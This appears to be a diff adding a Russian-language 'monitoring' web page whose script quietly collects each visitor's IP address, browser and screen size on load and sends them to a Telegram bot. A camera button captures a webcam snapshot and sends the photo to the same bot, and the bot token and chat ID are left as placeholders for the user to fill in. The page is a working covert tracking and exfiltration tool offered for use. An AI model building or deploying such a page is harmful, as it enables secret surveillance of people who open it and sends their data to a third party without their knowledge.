@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Мониторинг</title>
+  <style>
+    .sensor-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1rem; }
+    .sensor-card { background: #1e293b; padding: 1.5rem; border-radius: 12px; border: 2px solid #3b82f6; }
+    #telegramLog { max-height: 400px; overflow-y: auto; }
+  </style>
+</head>
+<body>
+  <nav class="navbar">...</nav>
+
+  <div class="section">
+    <h2><i class="fas fa-radar"></i> Сбор данных</h2>
+    
+    <div class="sensor-grid">
+      <div class="sensor-card" id="ipInfo">
+        <i class="fas fa-network-wired"></i> Загрузка данных...
+      </div>
+    </div>
+
+    <div style="text-align: center; margin: 2rem;">
+      <button onclick="requestCamera()" style="background: #3b82f6; padding: 1rem;">
+        <i class="fas fa-camera"></i> Сделать снимок
+      </button>
+    </div>
+
+    <div id="telegramLog" class="section"></div>
+  </div>
+
+<script>
+const BOT_TOKEN = '***ВАШ_ТОКЕН***';
+const CHAT_ID = '***ВАШ_CHAT_ID***';
+
+async function sendToTelegram(data) {
+  let message = `🕵️ *Данные пользователя*\\n`;
+  message += `• IP: \`${data.ip}\`\\n`;
+  message += `• Браузер: ${data.userAgent}\\n`;
+  message += `• Экран: ${data.screen}\\n`;
+  
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message,
+      parse_mode: 'MarkdownV2'
+    })
+  });
+
+  const log = document.getElementById('telegramLog');
+  log.innerHTML += `<div class="sensor-card"><i class="fas fa-paper-plane"></i> Данные отправлены: ${new Date().toLocaleTimeString()}</div>`;
+}
+
+async function collectData() {
+  const data = {
+    ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip),
+    userAgent: navigator.userAgent,
+    screen: `${screen.width}x${screen.height}`
+  };
+
+  document.getElementById('ipInfo').innerHTML = `
+    <i class="fas fa-network-wired"></i>
+    <h3>${data.ip}</h3>
+    <p>${data.userAgent}</p>
+    <p>Разрешение: ${data.screen}</p>
+  `;
+
+  sendToTelegram(data);
+}
+
+async function requestCamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.play();
+    
+    setTimeout(() => {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('photo', blob, 'snapshot.jpg');
+        formData.append('chat_id', CHAT_ID);
+        formData.append('caption', '📸 Снимок с камеры');
+        
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+      }, 'image/jpeg');
+      
+      stream.getTracks().forEach(track => track.stop());
+    }, 3000);
+  } catch (error) {
+    alert('Ошибка доступа к камере!');
+  }
+}
+
+window.onload = collectData;
+</script>
+</body>
+</html>
